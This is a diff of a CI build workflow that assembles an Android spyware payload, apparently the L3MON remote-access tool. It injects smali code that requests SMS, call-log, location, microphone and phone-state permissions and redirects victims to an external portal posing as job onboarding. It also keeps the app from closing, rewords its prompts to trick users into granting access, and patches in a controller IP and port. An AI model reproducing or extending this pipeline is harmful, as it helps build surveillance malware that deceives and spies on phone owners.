@@ -43,62 +43,24 @@ jobs:
             rm -rf "payload_source/smali/com/etechd"
           fi
 
-          # 1. Create Permission Injection File
-          # Using single quotes for the cat command to prevent variable expansion issues
-          cat > permissions.smali <<'PERM'
-    const/4 v0, 0x7
-    new-array v0, v0, [Ljava/lang/String;
-    const/4 v1, 0x0
-    const-string v2, "android.permission.READ_SMS"
-    aput-object v2, v0, v1
-    const/4 v1, 0x1
-    const-string v2, "android.permission.RECEIVE_SMS"
-    aput-object v2, v0, v1
-    const/4 v1, 0x2
-    const-string v2, "android.permission.READ_CALL_LOG"
-    aput-object v2, v0, v1
-    const/4 v1, 0x3
-    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
-    aput-object v2, v0, v1
-    const/4 v1, 0x4
-    const-string v2, "android.permission.RECORD_AUDIO"
-    aput-object v2, v0, v1
-    const/4 v1, 0x5
-    const-string v2, "android.permission.POST_NOTIFICATIONS"
-    aput-object v2, v0, v1
-    const/4 v1, 0x6
-    const-string v2, "android.permission.READ_PHONE_STATE"
-    aput-object v2, v0, v1
-    const/4 v1, 0x1
-PERM
-          # Add the dynamic line separately to avoid YAML/Shell expansion issues
-          echo "    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V" >> permissions.smali
+          # 1. Prepare Smali Snippets from Templates
+          # We replace the placeholder in the templates with the actual NEW_PATH
+          cp payload_source/permissions.smali.template permissions.smali
+          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" permissions.smali
+          
+          cp payload_source/redirect.smali.template redirect.smali
+          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" redirect.smali
 
-          # 2. Create Redirect Injection File
-          cat > redirect.smali <<'REDIR'
-    new-instance v0, Landroid/content/Intent;
-    const-string v1, "android.intent.action.VIEW"
-    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
-    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"
-    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
-    move-result-object v1
-    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
-REDIR
-          # Add the dynamic line separately
-          echo "    invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->startActivity(Landroid/content/Intent;)V" >> redirect.smali
-
-          # Inject using sed 'r' command
+          # 2. Inject Smali snippets using sed 'r' command
           sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r permissions.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions|r redirect.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-          # Prevent Activity from finishing immediately
+          # 3. Finalize Obfuscation
           sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
-
-          # Obfuscate Strings
           find payload_source -name "MainActivity.smali" -exec sed -i "s|Click 'Permissions'|Required Component Update|g" {} +
           find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable ALL permissions|Grant system stability rights|g" {} +
 
-          # Dynamic IP/Port Patching
+          # 4. Dynamic IP/Port Patching
           chmod +x patch_payload.sh
           sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
           ./patch_payload.sh
